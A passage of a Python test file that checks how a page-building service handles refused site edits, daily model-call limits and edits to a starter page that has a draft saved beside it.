    update = call_tool(client, "update_page", {"section": "headline", "text": "Invisalign in Palo Alto"}, key=key)

    assert tools_hosting.NO_CHANGES_YET == NO_CHANGES_YET and _plain(NO_CHANGES_YET)
    for res in (revise, update):
        assert res["isError"] and tool_text(res) == NO_CHANGES_YET
    assert fake.page_calls == [] and _page_sections(conn, biz) is None
    assert conn.execute("SELECT count(*) AS n FROM page_preview").fetchone()["n"] == 0
    # Task 6: each refusal's row says it was a site's (`site`), which the day's model calls leave out (auth.check_llm_cap)
    rows = conn.execute(
        "SELECT tool, ok, args_redacted FROM agent_action WHERE business_id = %s AND tool IN ('revise_page', 'update_page') "
        "ORDER BY id",
        (biz,),
    ).fetchall()
    assert [(r["tool"], r["ok"], r["args_redacted"].get("site")) for r in rows] == [
        ("revise_page", False, "true"),
        ("update_page", False, "true"),
    ]


def test_refused_quick_changes_on_a_site_leave_the_days_drafts_alone(client, conn, monkeypatch, fake):  # noqa: F811
    """Task 6 (Task 5's review): an assistant that keeps asking to revise a site -- each answered NO_CHANGES_YET before
    the model is asked -- must not use up the day's drafts, which the site's own words (`build_site`) need."""
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    monkeypatch.setenv("AGENT_SITES", "1")
    assert not call_tool(client, "create_page", {}, key=key)["isError"]  # the site's page: the look asked
    used = conn.execute(
        "SELECT count(*) AS n FROM agent_action WHERE business_id = %s AND tool = ANY(%s) "
        "AND (tool <> 'answer' OR args_redacted->>'free_text' = 'true')",
        (biz, [t for t in auth.LLM_TOOLS if t not in ("create_page", "build_site")]),
    ).fetchone()["n"]  # the plan's own model calls: the dental walk made it through the tools
    monkeypatch.setattr(auth, "LLM_CALLS_PER_DAY", used + 1)  # one more draft today, and no more
    for _n in range(3):
        refused = call_tool(client, "revise_page", {"instruction": "make it warmer"}, key=key)
        assert refused["isError"] and tool_text(refused) == NO_CHANGES_YET

    auth.check_llm_cap(conn, auth.Principal(key=keys.lookup(conn, key), ip="local"))  # the refusals spent none


def test_a_starter_page_is_changed_as_ever_with_a_sites_draft_left_beside_it(client, conn, monkeypatch, fake):  # noqa: F811
    """The page Admiry wrote wins over a draft left on its row (a site built before the starter page, or with the
    switch off since): its quick changes still work."""
    key, biz, _first = _created(client, conn, monkeypatch, fake)
    intake.save_draft(conn, landing.current(conn, biz)["id"], {**intake.draft(None), "family": "dental"})
    monkeypatch.setenv("AGENT_SITES", "1")

    revised = call_tool(client, "revise_page", {"instruction": "make it warmer"}, key=key)
    edited = call_tool(
        client, "update_page", {"section": "headline", "text": "Invisalign in Palo Alto, today"}, key=key
    )

    assert not revised["isError"], tool_text(revised)
    assert not edited["isError"], tool_text(edited)
